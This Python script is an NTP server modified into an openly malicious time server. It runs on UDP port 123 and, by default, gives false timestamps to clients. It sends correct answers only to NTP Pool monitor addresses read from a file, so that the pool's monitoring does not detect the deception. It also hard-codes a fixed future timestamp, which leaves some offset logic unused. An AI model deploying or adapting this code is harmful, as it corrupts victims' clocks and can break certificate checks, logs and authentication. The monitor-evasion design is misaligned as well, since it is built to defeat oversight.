"""Author: https://github.com/limifly/ntpserver"""

import datetime
import socket
import struct
import time
import queue
import threading
import select
import argparse
import subprocess
import random

taskQueue = queue.Queue()
stopFlag = False
isMalicious = False
monitorList = None

MY_TIME = 3915335217

def malicious_time(timestamp):
    """Modify timestamp as malicious behaviour

    Parameters:
    timestamp -- timestamp in system time

    Returns:
    corresponding malicious time
    """
    # randn b/w -0.01 and 0.01
    
    return timestamp + MALICIOUS_OFFSET + random.uniform(-0.001, 0.001)

def system_to_ntp_time(timestamp):
    """Convert a system time to a NTP time.

    Parameters:
    timestamp -- timestamp in system time

    Returns:
    corresponding NTP time
    """
    return timestamp + NTP.NTP_DELTA

def _to_int(timestamp):
    """Return the integral part of a timestamp.

    Parameters:
    timestamp -- NTP timestamp

    Retuns:
    integral part
    """
    return int(timestamp)

def _to_frac(timestamp, n=32):
    """Return the fractional part of a timestamp.

    Parameters:
    timestamp -- NTP timestamp
    n         -- number of bits of the fractional part

    Retuns:
    fractional part
    """
    return int(abs(timestamp - _to_int(timestamp)) * 2**n)

def _to_time(integ, frac, n=32):
    """Return a timestamp from an integral and fractional part.

    Parameters:
    integ -- integral part
    frac  -- fractional part
    n     -- number of bits of the fractional part

    Retuns:
    timestamp
    """
    return integ + float(frac)/2**n	
		
class MonitorList:
    """Monitor ip list class.

    This represents the list of NTP Pool monitor IP addresses 
    that will receive an incorrect timestamp.
    """

    def __init__(self, file_path):
        """Constructor.

        Parameters:
        file_path      -- Path to file with IP addresses to fool
        """

        try:
            with open(file_path) as f:
                contents = f.read()
                self.monitor_ips = contents.split() # Split on spaces by default
        except Exception as e:
            self.monitor_ips = []
            print(f"[ERROR] | {datetime.datetime.now().isoformat()} | {e}")
        
    def is_monitor_ip(self, ip_address):
        """Checks whether an IP address is one of the IP addresses 
        of the NTP Pool monitors

        Parameters:
        ip_address      -- IP address to check

        Returns:
        boolean representing if the given IP was a monitor IP
        """

        return ip_address in self.monitor_ips


class NTPException(Exception):
    """Exception raised by this module."""
    pass


class NTP:
    """Helper class defining constants."""

    _SYSTEM_EPOCH = datetime.date(*time.gmtime(0)[0:3])
    """system epoch"""
    _NTP_EPOCH = datetime.date(1900, 1, 1)
    """NTP epoch"""
    NTP_DELTA = (_SYSTEM_EPOCH - _NTP_EPOCH).days * 24 * 3600
    """delta between system and NTP time"""

    REF_ID_TABLE = {
            'DNC': "DNC routing protocol",
            'NIST': "NIST public modem",
            'TSP': "TSP time protocol",
            'DTS': "Digital Time Service",
            'ATOM': "Atomic clock (calibrated)",
            'VLF': "VLF radio (OMEGA, etc)",
            'callsign': "Generic radio",
            'LORC': "LORAN-C radionavidation",
            'GOES': "GOES UHF environment satellite",
            'GPS': "GPS UHF satellite positioning",
    }
    """reference identifier table"""

    STRATUM_TABLE = {
        0: "unspecified",
        1: "primary reference",
    }
    """stratum table"""

    MODE_TABLE = {
        0: "unspecified",
        1: "symmetric active",
        2: "symmetric passive",
        3: "client",
        4: "server",
        5: "broadcast",
        6: "reserved for NTP control messages",
        7: "reserved for private use",
    }
    """mode table"""

    LEAP_TABLE = {
        0: "no warning",
        1: "last minute has 61 seconds",
        2: "last minute has 59 seconds",
        3: "alarm condition (clock not synchronized)",
    }
    """leap indicator table"""

class NTPPacket:
    """NTP packet class.

    This represents an NTP packet.
    """
    
    _PACKET_FORMAT = "!B B B b 11I"
    """packet format to pack/unpack"""

    def __init__(self, version=4, mode=3, tx_timestamp=0):
        """Constructor.

        Parameters:
        version      -- NTP version
        mode         -- packet mode (client, server)
        tx_timestamp -- packet transmit timestamp
        """
        self.leap = 0
        """leap second indicator"""
        self.version = version
        """version"""
        self.mode = mode
        """mode"""
        self.stratum = 0
        """stratum"""
        self.poll = 0
        """poll interval"""
        self.precision = 0
        """precision"""
        self.root_delay = 0
        """root delay"""
        self.root_dispersion = 0
        """root dispersion"""
        self.ref_id = 0
        """reference clock identifier"""
        self.ref_timestamp = 0
        """reference timestamp"""
        self.orig_timestamp = 0
        self.orig_timestamp_high = 0
        self.orig_timestamp_low = 0
        """originate timestamp"""
        self.recv_timestamp = 0
        """receive timestamp"""
        self.tx_timestamp = tx_timestamp
        self.tx_timestamp_high = 0
        self.tx_timestamp_low = 0
        """tansmit timestamp"""
        
    def to_data(self):
        """Convert this NTPPacket to a buffer that can be sent over a socket.

        Returns:
        buffer representing this packet

        Raises:
        NTPException -- in case of invalid field
        """
        try:
            packed = struct.pack(NTPPacket._PACKET_FORMAT,
                (self.leap << 6 | self.version << 3 | self.mode),
                self.stratum,
                self.poll,
                self.precision,
                _to_int(self.root_delay) << 16 | _to_frac(self.root_delay, 16),
                _to_int(self.root_dispersion) << 16 |
                _to_frac(self.root_dispersion, 16),
                self.ref_id,
                _to_int(self.ref_timestamp),
                _to_frac(self.ref_timestamp),
                #Change by lichen, avoid loss of precision
                self.orig_timestamp_high,
                self.orig_timestamp_low,
                _to_int(self.recv_timestamp),
                _to_frac(self.recv_timestamp),
                _to_int(self.tx_timestamp),
                _to_frac(self.tx_timestamp))
        except struct.error as e:
            raise NTPException(f"Invalid NTP packet fields: {e}")
        except Exception as e:
            raise e
        return packed

    def from_data(self, data):
        """Populate this instance from a NTP packet payload received from
        the network.

        Parameters:
        data -- buffer payload

        Raises:
        NTPException -- in case of invalid packet format
        """
        try:
            unpacked = struct.unpack(NTPPacket._PACKET_FORMAT,
                    data[0:struct.calcsize(NTPPacket._PACKET_FORMAT)])
        except struct.error:
            raise NTPException("Invalid NTP packet. raw data: " + data.hex())
        except Exception as e:
            raise e

        self.leap = unpacked[0] >> 6 & 0x3
        self.version = unpacked[0] >> 3 & 0x7
        self.mode = unpacked[0] & 0x7
        self.stratum = unpacked[1]
        self.poll = unpacked[2]
        self.precision = unpacked[3]
        self.root_delay = float(unpacked[4])/2**16
        self.root_dispersion = float(unpacked[5])/2**16
        self.ref_id = unpacked[6]
        self.ref_timestamp = _to_time(unpacked[7], unpacked[8])
        self.orig_timestamp = _to_time(unpacked[9], unpacked[10])
        self.orig_timestamp_high = unpacked[9]
        self.orig_timestamp_low = unpacked[10]
        self.recv_timestamp = _to_time(unpacked[11], unpacked[12])
        self.tx_timestamp = _to_time(unpacked[13], unpacked[14])
        self.tx_timestamp_high = unpacked[13]
        self.tx_timestamp_low = unpacked[14]

    def GetTxTimeStamp(self):
        return (self.tx_timestamp_high,self.tx_timestamp_low)

    def SetOriginTimeStamp(self,high,low):
        self.orig_timestamp_high = high
        self.orig_timestamp_low = low
        

class RecvThread(threading.Thread):
    def __init__(self,socket):
        threading.Thread.__init__(self)
        self.socket = socket
    def run(self):
        global taskQueue,stopFlag,isMalicious,monitorList
        while True:
            if stopFlag == True:
                print(f"[LOG] | {datetime.datetime.now().isoformat()} | RecvThread Ended")
                break
            rlist,wlist,elist = select.select([self.socket],[],[],1)
            if len(rlist) != 0:
                print(f"[LOG] | {datetime.datetime.now().isoformat()} | Received {len(rlist)} packets")
                for tempSocket in rlist:
                    try:
                        data,addr = tempSocket.recvfrom(1024)

                        # addr is a tuple (ip, port)
                        t = time.time()
                        # Malicious behaviour
                        if isMalicious and not monitorList.is_monitor_ip(addr[0]): 
                            t = malicious_time(t)

                        recvTimestamp = recvTimestamp = system_to_ntp_time(t)
                        taskQueue.put((data,addr,recvTimestamp))
                        print(f"[LOG] | {datetime.datetime.now().isoformat()} | {addr[0]}:{addr[1]} | Received NTP request )")
                    except socket.error as msg:
                        print(f"[ERROR] | {datetime.datetime.now().isoformat()} | {msg}")
                    except Exception as e:
                        print(f"[ERROR] | {datetime.datetime.now().isoformat()} | {e}")

class WorkThread(threading.Thread):
    def __init__(self,socket):
        threading.Thread.__init__(self)
        self.socket = socket
    def run(self):
        global taskQueue,stopFlag,isMalicious,monitorList
        while True:
            if stopFlag == True:
                print(f"[LOG] | {datetime.datetime.now().isoformat()} | WorkThread Ended")
                break
            try:
                data,addr,recvTimestamp = taskQueue.get(timeout=1)
                recvPacket = NTPPacket()
                recvPacket.from_data(data)
                timeStamp_high,timeStamp_low = recvPacket.GetTxTimeStamp()
                sendPacket = NTPPacket(version=4,mode=4)
                sendPacket.stratum = 2
                sendPacket.poll = 3
                '''
                sendPacket.precision = 0xfa
                sendPacket.root_delay = 0x0bfa
                '''
                sendPacket.root_dispersion = 0x00000008
                sendPacket.ref_id = 0x14653909
                # sendPacket.ref_timestamp = recvTimestamp-2
                sendPacket.ref_timestamp = MY_TIME-60
                sendPacket.SetOriginTimeStamp(timeStamp_high,timeStamp_low)
                # sendPacket.recv_timestamp = recvTimestamp
                sendPacket.recv_timestamp = MY_TIME

                # addr is a tuple (ip, port)
                t = time.time()
                # Malicious behaviour
                doModifyPacket = isMalicious and not monitorList.is_monitor_ip(addr[0])
                if doModifyPacket: 
                    t = malicious_time(t)

                sendPacket.tx_timestamp = MY_TIME

                # Send the packet:
                socket.sendto(sendPacket.to_data(),addr)
                print(f"[LOG] | {datetime.datetime.now().isoformat()} | {addr[0]}:{addr[1]} | Sent NTP reply (malicious: {doModifyPacket})")
            except queue.Empty:
                continue
            except NTPException as e:
                print(f"[ERROR] | {datetime.datetime.now().isoformat()} | {e}")
            except Exception as e:
                print(f"[ERROR] | {datetime.datetime.now().isoformat()} | {e}")
                
parser = argparse.ArgumentParser()
parser.add_argument('monitorList', type=str, default='monitors.txt', help="path to text file of space-separated ip addresses")
parser.add_argument('--isMalicious', type=bool, default=True, required=False, help="indicates whether the server should be malicious (default True)")
parser.add_argument('--TrueServer', type=bool, default=False, required=False, help="indicates whether the server should be a true NTP server (default False)")
parser.add_argument('--Offset', type=int, default=900, required=False, help="Define offset for Server in Malicious Mode (default 1000)")
args = parser.parse_args()
        
isMalicious = args.isMalicious
monitorList = MonitorList(args.monitorList)
MALICIOUS_OFFSET = args.Offset
listenIp = "0.0.0.0"            # All network interfaces
listenPort = 123    # NTP port (usually UDP 123)
ServerMode = args.TrueServer

socket = socket.socket(socket.AF_INET,socket.SOCK_DGRAM) 
socket.bind((listenIp,listenPort))      
print(f"[LOG] | {datetime.datetime.now().isoformat()} | Started socket listening on: {socket.getsockname()}")
recvThread = RecvThread(socket)
recvThread.start()
workThread = WorkThread(socket)
workThread.start()

try:
    while True:
        try:
            time.sleep(0.5)
        except KeyboardInterrupt:
            print(f"[LOG] | {datetime.datetime.now().isoformat()} | Error... Exiting...")
            break
finally:
    print(f"[LOG] | {datetime.datetime.now().isoformat()} | Wrapping up!! Exiting...")
    stopFlag = True
    recvThread.join()
    workThread.join()
    socket.close()

    if ServerMode:
        try:
            print(f"[LOG] | {datetime.datetime.now().isoformat()} | (Re)starting the benign NTP server")
            subprocess.call(["systemctl", "restart", "ntp"])
            subprocess.call(["service", "ntp", "start"])
        except Exception as e:
            print(f"[ERROR] | Failed to start NTP Server! | {e}")
    print(f"[LOG] | {datetime.datetime.now().isoformat()} | Exiting...")